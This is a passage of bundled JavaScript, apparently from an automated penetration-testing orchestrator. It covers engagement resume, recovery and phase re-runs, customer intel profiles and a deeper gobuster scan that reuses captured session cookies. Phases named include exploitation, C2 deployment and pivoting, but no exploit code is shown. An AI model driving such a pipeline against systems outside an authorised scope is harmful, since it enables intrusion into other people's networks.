      const critCount = state.assets.reduce((sum, a) => sum + a.vulns.filter((v) => v.severity === "critical").length, 0);
      const highCount = state.assets.reduce((sum, a) => sum + a.vulns.filter((v) => v.severity === "high").length, 0);
      const medCount = state.assets.reduce((sum, a) => sum + a.vulns.filter((v) => v.severity === "medium").length, 0);
      const lowCount = state.assets.reduce((sum, a) => sum + a.vulns.filter((v) => v.severity === "low" || v.severity === "info").length, 0);
      const totalServices = state.assets.reduce((sum, a) => sum + a.ports.filter((p) => p.service && p.service !== "unknown").length, 0);
      const totalPorts = state.assets.reduce((sum, a) => sum + a.ports.length, 0);
      const technologies = [...new Set(
        state.assets.flatMap((a) => [
          ...a.passiveRecon?.technologies || [],
          ...(a.ports || []).map((p) => p.service).filter(Boolean),
          a.wafDetected ? `WAF: ${a.wafDetected}` : ""
        ].filter(Boolean))
      )];
      const weaknessCategories = [...new Set(
        state.assets.flatMap(
          (a) => a.vulns.map((v) => v.cwe || "").filter(Boolean)
        )
      )];
      const snapshot = {
        engagementId,
        date: (/* @__PURE__ */ new Date()).toISOString(),
        customerId: engagement.customerName || `eng-${engagementId}`,
        customerName: engagement.customerName || engagement.name || `Engagement #${engagementId}`,
        findings: {
          total: state.stats.vulnsFound || 0,
          critical: critCount,
          high: highCount,
          medium: medCount,
          low: lowCount
        },
        assets: {
          total: state.assets.length,
          hosts: state.assets.filter((a) => a.hostname || a.ip).length,
          services: totalServices,
          exposedPorts: totalPorts
        },
        technologies,
        weaknessCategories
      };
      await updateProfileFromEngagement(snapshot);
      addLog(state, {
        phase: "completed",
        type: "info",
        title: `\u{1F4CA} Customer Intel Profile updated for "${snapshot.customerName}"`,
        detail: `Profile updated with ${snapshot.findings.total} findings across ${snapshot.assets.total} assets. Technologies: ${technologies.length}. Weakness categories: ${weaknessCategories.length}.`
      });
      broadcastOpsUpdate(state.engagementId, { type: "log_update" });
      console.log(`[CustomerIntel] Engagement #${engagementId}: Profile updated for "${snapshot.customerName}"`);
    } catch (cipErr) {
      console.warn(`[CustomerIntel] Failed to update profile for #${engagementId}:`, cipErr.message);
    }
  } catch (e) {
    clearInterval(heartbeatInterval);
    clearInterval(periodicPersistInterval);
    state.phase = "error";
    state.isRunning = false;
    state.error = e.message;
    addLog(state, { phase: "error", type: "error", title: "Pipeline Error", detail: e.message });
    await persistOpsStateNow(engagementId);
    try {
      const { updateEngagement } = await import("./db-D773P4Y2.js");
      const existingEng = await (await import("./db-D773P4Y2.js")).getEngagementById(engagementId);
      const existingNotes = existingEng?.notes || "";
      let parsedNotes = {};
      try {
        parsedNotes = existingNotes ? JSON.parse(existingNotes) : {};
      } catch {
        parsedNotes = { originalNotes: existingNotes };
      }
      const errorNote = JSON.stringify({
        ...parsedNotes,
        pipelineError: e.message?.slice(0, 2e3),
        errorPhase: state.phase || "unknown",
        errorAt: (/* @__PURE__ */ new Date()).toISOString()
      });
      await updateEngagement(engagementId, {
        status: "paused",
        notes: errorNote
      });
      console.log(`[Engagement] Marked #${engagementId} as paused (error) in DB`);
    } catch (statusErr) {
      console.error(`[Engagement] Failed to mark #${engagementId} as error:`, statusErr.message);
    }
    try {
      clearKnowledgeCache();
    } catch {
    }
    try {
      const { notifyOwner } = await import("./notification-4RFY3TAD.js");
      const durationMs = Date.now() - (state.startedAt || Date.now());
      const durationMin = Math.round(durationMs / 6e4);
      await notifyOwner({
        title: `\u274C Engagement #${engagementId} Failed \u2014 ${state.phase} phase error`,
        content: [
          `${state.engagementType.toUpperCase()} engagement #${engagementId} encountered an error.`,
          ``,
          `Error: ${e.message}`,
          `Last phase: ${state.log.length > 0 ? state.log[state.log.length - 1].phase : "unknown"}`,
          `Duration: ${durationMin} minutes`,
          `Assets: ${state.assets.length} | Vulns: ${state.stats.vulnsFound}`,
          `Log entries: ${state.log.length}`,
          ``,
          `The engagement state has been saved. Use Resume to continue from the last checkpoint.`
        ].join("\n")
      });
    } catch (notifErr) {
      console.warn(`[Notification] Error notification failed for #${engagementId}:`, notifErr.message);
    }
  }
}
function stopEngagement(engagementId) {
  const state = opsStates.get(engagementId);
  if (!state) return false;
  state.isRunning = false;
  state.isPaused = false;
  state.currentAction = "Stopped by operator";
  addLog(state, { phase: state.phase, type: "info", title: "\u23F9 Execution Stopped", detail: "Operator stopped the engagement execution. Use 'Resume' to continue from this phase." });
  broadcastOpsUpdate(engagementId, { type: "stopped" });
  persistOpsStateNow(engagementId);
  return true;
}
async function resumeEngagement(engagementId, operatorCtx) {
  let state = await getOpsStateWithRecovery(engagementId);
  if (!state) {
    return { success: false, message: "No saved state found for this engagement. Start a new execution instead." };
  }
  if (state.isRunning) {
    return { success: false, message: "Engagement is already running." };
  }
  if (state.phase === "completed") {
    return { success: false, message: "Engagement already completed. Start a new execution to re-run." };
  }
  const validPipelinePhases = /* @__PURE__ */ new Set(["recon", "passive_discovery", "scoping", "test_plan", "test_plan_approval", "enumeration", "vuln_detection", "social_engineering", "exploitation", "post_exploit"]);
  let resumePhase = "recon";
  if (state.phase === "error" || state.phase === "idle" || state.phase === "paused") {
    for (let i = state.log.length - 1; i >= 0; i--) {
      const logPhase = state.log[i].phase;
      if (validPipelinePhases.has(logPhase)) {
        resumePhase = logPhase;
        break;
      }
    }
  } else if (validPipelinePhases.has(state.phase)) {
    resumePhase = state.phase;
  }
  try {
    const { claimEngagement } = await import("./engagement-claim-lock-3DJGBX7I.js");
    const claim = await claimEngagement(engagementId, { force: true });
    if (!claim.claimed) {
      return {
        success: false,
        message: `Cannot resume: another server instance (${claim.currentOwner}) owns this engagement. ${claim.reason}`
      };
    }
  } catch (e) {
    console.warn(`[ResumeEngagement] Claim lock check failed (proceeding anyway): ${e.message}`);
  }
  state.error = void 0;
  state.isRunning = false;
  const staleCount = dismissAllStaleApprovals(engagementId, `auto-resume:${operatorCtx.id}`);
  if (staleCount > 0) {
    addLog(state, {
      phase: resumePhase,
      type: "info",
      title: `\u{1F5D1}\uFE0F Dismissed ${staleCount} stale approval gate(s)`,
      detail: `Cleared orphaned approval gates from previous run before resuming.`
    });
  }
  state.isPaused = false;
  executeEngagement(engagementId, operatorCtx, {
    startPhase: resumePhase,
    resume: true
  });
  return {
    success: true,
    message: `Resuming engagement from phase: ${resumePhase}. ${state.assets.length} assets, ${state.stats.vulnsFound} vulns recovered.`,
    resumePhase
  };
}
async function recoverInterruptedEngagements() {
  const result = {
    recovered: 0,
    engagements: []
  };
  try {
    const { getDbRequired } = await import("./db-D773P4Y2.js");
    const db = await getDbRequired();
    const { engagementOpsSnapshots } = await import("./schema-RL5B6OMI.js");
    const { eq } = await import("drizzle-orm");
    const interrupted = await db.select().from(engagementOpsSnapshots).where(eq(engagementOpsSnapshots.isRunning, 1));
    for (const row of interrupted) {
      const engId = row.engagementId;
      try {
        let phase = "unknown";
        let assetCount = 0;
        try {
          const snapshotData = typeof row.stateJson === "string" ? JSON.parse(row.stateJson) : row.stateJson;
          phase = snapshotData?.phase || "unknown";
          assetCount = snapshotData?.assets?.length || 0;
        } catch {
        }
        try {
          await db.update(engagementOpsSnapshots).set({ isRunning: 0 }).where(eq(engagementOpsSnapshots.engagementId, engId));
        } catch {
        }
        result.recovered++;
        result.engagements.push({ id: engId, phase, assets: assetCount });
        console.log(`[StartupRecovery] Recovered engagement #${engId}: phase=${phase}, assets=${assetCount} (state NOT loaded into memory \u2014 will load on Resume)`);
      } catch (e) {
        console.error(`[StartupRecovery] Failed to recover engagement #${engId}:`, e.message);
      }
    }
    if (result.recovered > 0) {
      try {
        const { notifyOwner } = await import("./notification-4RFY3TAD.js");
        const engList = result.engagements.map((e) => `  \u2022 #${e.id}: last phase = ${e.phase}, ${e.assets} assets preserved`).join("\n");
        await notifyOwner({
          title: `\u26A0\uFE0F ${result.recovered} Interrupted Engagement${result.recovered > 1 ? "s" : ""} Recovered`,
          content: [
            `The server restarted and ${result.recovered} engagement${result.recovered > 1 ? "s were" : " was"} interrupted mid-execution.`,
            ``,
            `Recovered engagements:`,
            engList,
            ``,
            `All asset data and progress has been preserved. Use the Resume button on the Engagement Ops page to continue from the last checkpoint.`
          ].join("\n")
        });
      } catch (notifErr) {
        console.warn("[StartupRecovery] Notification failed:", notifErr.message);
      }
    }
  } catch (e) {
    console.error("[StartupRecovery] Recovery scan failed:", e.message);
  }
  return result;
}
async function rerunFromPhase(engagementId, targetPhase, operatorCtx) {
  const PHASE_ORDER = [
    "recon",
    "enumeration",
    "vuln_detection",
    "social_engineering",
    "exploitation",
    "post_exploit"
  ];
  const targetIdx = PHASE_ORDER.indexOf(targetPhase);
  if (targetIdx < 0) {
    return { success: false, message: `Invalid phase: ${targetPhase}. Must be one of: ${PHASE_ORDER.join(", ")}` };
  }
  let state = await getOpsStateWithRecovery(engagementId);
  if (!state) {
    return { success: false, message: "No saved state found for this engagement. Run it first before re-running from a specific phase." };
  }
  if (state.isRunning) {
    return { success: false, message: "Engagement is currently running. Stop it first before re-running." };
  }
  const phasesToKeep = PHASE_ORDER.slice(0, targetIdx);
  const phasesToClear = PHASE_ORDER.slice(targetIdx);
  state.log = state.log.filter((l) => phasesToKeep.includes(l.phase));
  if (targetIdx <= 1) {
    for (const asset of state.assets) {
      asset.ports = [];
      asset.toolResults = [];
    }
    state.stats.portsFound = 0;
  }
  if (targetIdx <= 2) {
    for (const asset of state.assets) {
      asset.vulns = [];
      asset.zapFindings = [];
      asset.nucleiFindings = [];
    }
    state.stats.vulnsFound = 0;
    state.stats.zapScansRun = 0;
  }
  if (targetIdx <= 3) {
    for (const asset of state.assets) {
      asset.exploitAttempts = [];
    }
    state.stats.exploitsAttempted = 0;
    state.stats.exploitsSucceeded = 0;
    state.stats.sessionsOpened = 0;
  }
  if (targetIdx <= 4) {
    state.completedAt = void 0;
  }
  state.error = void 0;
  state.isRunning = false;
  state.progress = Math.round(targetIdx / PHASE_ORDER.length * 100);
  addLog(state, {
    phase: targetPhase,
    type: "info",
    title: `\u{1F504} Re-run from ${targetPhase.replace(/_/g, " ")}`,
    detail: `Operator initiated re-run from ${targetPhase}. Preserved data from: ${phasesToKeep.join(", ") || "none"}. Clearing: ${phasesToClear.join(", ")}.`
  });
  opsStates.set(engagementId, state);
  await persistOpsStateNow(engagementId);
  executeEngagement(engagementId, operatorCtx, {
    startPhase: targetPhase,
    resume: false
  });
  return {
    success: true,
    message: `Re-running engagement #${engagementId} from ${targetPhase}. Preserved ${phasesToKeep.length} prior phase(s), ${state.assets.length} assets, ${state.log.length} log entries.`
  };
}
async function rescanAssetWithDeeperProfile(engagementId, assetHostname, options) {
  let state = getOpsState(engagementId);
  if (!state) state = await getOpsStateWithRecovery(engagementId);
  if (!state) {
    return { success: false, message: "No engagement state found. Run the engagement first." };
  }
  const asset = state.assets.find(
    (a) => a.hostname.toLowerCase() === assetHostname.toLowerCase() || a.ip === assetHostname
  );
  if (!asset) {
    return {
      success: false,
      message: `Asset "${assetHostname}" not found in engagement #${engagementId}. Available: ${state.assets.map((a) => a.hostname).join(", ")}`
    };
  }
  const currentProfile = state.scanProfile || "quick";
  const currentIdx = PROFILE_ESCALATION_ORDER.indexOf(currentProfile);
  let targetProfile = options?.targetProfile;
  if (!targetProfile) {
    const nextIdx = Math.min(currentIdx + 1, PROFILE_ESCALATION_ORDER.length - 1);
    targetProfile = PROFILE_ESCALATION_ORDER[nextIdx];
    if (targetProfile === currentProfile) {
      return {
        success: false,
        message: `Asset "${assetHostname}" is already at the maximum profile level (${currentProfile}). Cannot escalate further.`,
        previousProfile: currentProfile
      };
    }
  }
  const targetIdx = PROFILE_ESCALATION_ORDER.indexOf(targetProfile);
  if (targetIdx < 0) {
    return { success: false, message: `Invalid target profile: ${targetProfile}. Must be one of: ${PROFILE_ESCALATION_ORDER.join(", ")}` };
  }
  if (targetIdx <= currentIdx && !options?.targetProfile) {
    return {
      success: false,
      message: `Target profile "${targetProfile}" is not deeper than current "${currentProfile}".`,
      previousProfile: currentProfile
    };
  }
  const profile = getScanProfile(targetProfile);
  const httpPort = asset.ports.find((p) => p.service === "http" || p.service === "https" || p.port === 80 || p.port === 443);
  const protocol = httpPort?.port === 443 || httpPort?.service === "https" ? "https" : "http";
  const port = httpPort?.port || 80;
  const targetUrl = port === 80 || port === 443 ? `${protocol}://${asset.hostname}` : `${protocol}://${asset.hostname}:${port}`;
  const wafDetected = !!(asset.wafDetected && asset.wafDetected !== "none");
  const detectedTech = asset.passiveRecon?.technologies || [];
  const isApiTarget = asset.type === "api" || asset.ports.some((p) => /api|graphql|rest/i.test(p.service || "")) || /\/api\/|\/v[0-9]+\//i.test(targetUrl);
  let authCookie = "";
  const webCreds = (asset.confirmedCredentials || []).filter(
    (c) => ["http", "web", "form", "http-get", "http-post-form"].includes(c.service)
  );
  if (webCreds.length > 0 && webCreds[0].sessionCookie) {
    authCookie = webCreds[0].sessionCookie;
  } else if (asset.trainingLabCreds?.sessionCookie) {
    authCookie = asset.trainingLabCreds.sessionCookie;
  }
  const command = buildGobusterCommand(profile, targetUrl, {
    wafDetected,
    authCookie: authCookie || void 0,
    detectedTech,
    isApiTarget
  });
  addLog(state, {
    phase: state.phase || "enumeration",
    type: "info",
    title: `\u2B06\uFE0F Profile Escalation: ${currentProfile} \u2192 ${targetProfile} for ${asset.hostname}`,
    detail: `Operator requested deeper content discovery scan. Previous profile: ${currentProfile}, new profile: ${targetProfile}.
Command: ${command}`,
    data: { previousProfile: currentProfile, newProfile: targetProfile, asset: asset.hostname, command }
  });
  try {
    const { executeTool } = await import("./scan-server-executor-WPL2NRYI.js");
    const scanResult = await executeTool({
      tool: "gobuster",
      args: command.replace(/^gobuster\s+/, ""),
      timeout: profile.gobuster.timeout || 600
    });
    const newPaths = [];
    if (scanResult.stdout) {
      const lines = scanResult.stdout.split("\n");
      for (const line of lines) {
        const pathMatch = line.match(/^(\/\S+)\s+\(Status:\s*(\d+)\)/);
        if (pathMatch) {
          const [, path2, status] = pathMatch;
          const statusCode = parseInt(status);
          if (statusCode >= 200 && statusCode < 400) {
            newPaths.push(path2);
          }
        }
      }
    }
    if (!asset.toolResults) asset.toolResults = [];
    asset.toolResults.push({
      tool: "gobuster",
      command,
      output: scanResult.stdout?.substring(0, 5e3) || "",
      timestamp: Date.now(),
      profile: targetProfile,
      pathsFound: newPaths.length
    });
    addLog(state, {
      phase: state.phase || "enumeration",
      type: newPaths.length > 0 ? "finding" : "info",
      title: `\u2705 Deeper Scan Complete: ${newPaths.length} new paths on ${asset.hostname}`,
      detail: `Profile "${targetProfile}" Gobuster scan completed. Found ${newPaths.length} accessible paths.${newPaths.length > 0 ? "\nNew paths: " + newPaths.slice(0, 20).join(", ") + (newPaths.length > 20 ? ` (+${newPaths.length - 20} more)` : "") : ""}`,
      data: { paths: newPaths, profile: targetProfile, command }
    });
    state.scanProfile = targetProfile;
    broadcastOpsUpdate(engagementId, { type: "log_update" });
    await persistOpsStateNow(engagementId);
    return {
      success: true,
      message: `Deeper scan completed: ${newPaths.length} paths found on ${asset.hostname} with "${targetProfile}" profile.`,
      previousProfile: currentProfile,
      newProfile: targetProfile,
      assetHostname: asset.hostname,
      command
    };
  } catch (err) {
    addLog(state, {
      phase: state.phase || "enumeration",
      type: "error",
      title: `\u274C Deeper Scan Failed: ${asset.hostname}`,
      detail: `Profile escalation scan failed: ${err.message}`
    });
    broadcastOpsUpdate(engagementId, { type: "log_update" });
    return {
      success: false,
      message: `Deeper scan failed: ${err.message}`,
      previousProfile: currentProfile,
      newProfile: targetProfile,
      assetHostname: asset.hostname
    };
  }
}
var breathe, _serverInstanceId, KNOWN_INFRA_IPS, opsStates, MAX_CONCURRENT_ENGAGEMENTS, approvalResolvers, idCounter, persistTimers, periodicPersistTimers, engagementAbortControllers, memoryWatchdogInterval, OPS_TO_TIMELINE_TYPE, OPS_TO_SEVERITY, PROFILE_ESCALATION_ORDER;
var init_engagement_orchestrator = __esm({
  "server/lib/engagement-orchestrator.ts"() {
    init_llm();
    init_scan_service_url();
    init_llm_throttle();
    init_scan_profiles();
    init_pipeline_phases();
    init_knowledge_lazy();
    init_ws_event_hub();
    init_engagement_training_bridge();
    init_ws_event_hub();
    init_scan_concurrency();
    init_job_queue_bridge();
    init_owasp_coverage_tracker();
    init_safety_engine();
    init_domain_safety_whitelist();
    init_evidence_integrity_guardrails();
    init_server_instance();
    init_service_resolver();
    init_engagement_integration();
    init_exploit_learning_engine();
    init_tool_output_parsers();
    breathe = () => new Promise((resolve) => setImmediate(resolve));
    _serverInstanceId = SERVER_INSTANCE_ID;
    KNOWN_INFRA_IPS = new Set([
      process.env.SCAN_SERVER_HOST || "",
      SCANFORGE_DEDICATED_IP,
      // 137.184.71.192
      "137.184.211.238"
      // New scan server (hosts BC, DVWA, etc.)
    ].filter(Boolean));
    opsStates = /* @__PURE__ */ new Map();
    MAX_CONCURRENT_ENGAGEMENTS = 10;
    approvalResolvers = /* @__PURE__ */ new Map();
    idCounter = 0;
    persistTimers = /* @__PURE__ */ new Map();
    periodicPersistTimers = /* @__PURE__ */ new Map();
    engagementAbortControllers = /* @__PURE__ */ new Map();
    memoryWatchdogInterval = null;
    OPS_TO_TIMELINE_TYPE = {
      phase_complete: "phase_completed",
      scan_result: "scan_completed",
      finding: "finding_discovered",
      exploit_attempt: "exploit_attempted",
      exploit_success: "exploit_succeeded",
      exploit_fail: "exploit_attempted",
      c2_deploy: "shell_obtained",
      pivot: "pivot_established",
      evidence: "data_collected",
      llm_decision: "tool_executed",
      zap_scan: "scan_completed",
      waf_detected: "opsec_alert",
      warning: "opsec_alert"
    };
    OPS_TO_SEVERITY = {
      phase_complete: "info",
      scan_result: "info",
      finding: "medium",
      exploit_attempt: "high",
      exploit_success: "critical",
      exploit_fail: "medium",
      c2_deploy: "critical",
      pivot: "critical",
      evidence: "high",
      llm_decision: "info",
      zap_scan: "low",
      waf_detected: "high",
      warning: "medium"
    };
    PROFILE_ESCALATION_ORDER = [
      "quick",
      "standard",
      "deep"
    ];
  }
});

export {
  enrichPortServices,
  init_service_resolver,
  parseToolOutput,
  init_tool_output_parsers,
  KNOWN_INFRA_IPS,
  getEffectiveTarget,
  MAX_CONCURRENT_ENGAGEMENTS,
  pushVulnDeduped,
  getOpsState,
  clearOpsState,
  normalizeOpsState,
  getOpsStateWithRecovery,
  isInRoeScope,
  initOpsState,
  persistOpsStateDebounced,
  persistOpsStateNow,
  getEngagementAbortSignal,
  abortEngagement,
  startMemoryWatchdog,
  stopMemoryWatchdog,
  getHealthStatus,
  flushAllPendingState,
  broadcastOpsUpdate,
  broadcastReconFinding,
  broadcastCredentialFound,
  broadcastExploitFired,
  broadcastExploitResult,
  addLog,
  persistScanResult,
  requestApproval,
  resolveApproval,
  dismissStaleApproval,
  dismissAllStaleApprovals,
  getApprovalGateDetail,
  auditLog,
  generateScanPlan,
  llmDecide,
  executeVulnDetection,
  executeEngagement,
  stopEngagement,
  resumeEngagement,
  recoverInterruptedEngagements,
  rerunFromPhase,
  rescanAssetWithDeeperProfile,
  engagement_orchestrator_exports,
  init_engagement_orchestrator
};
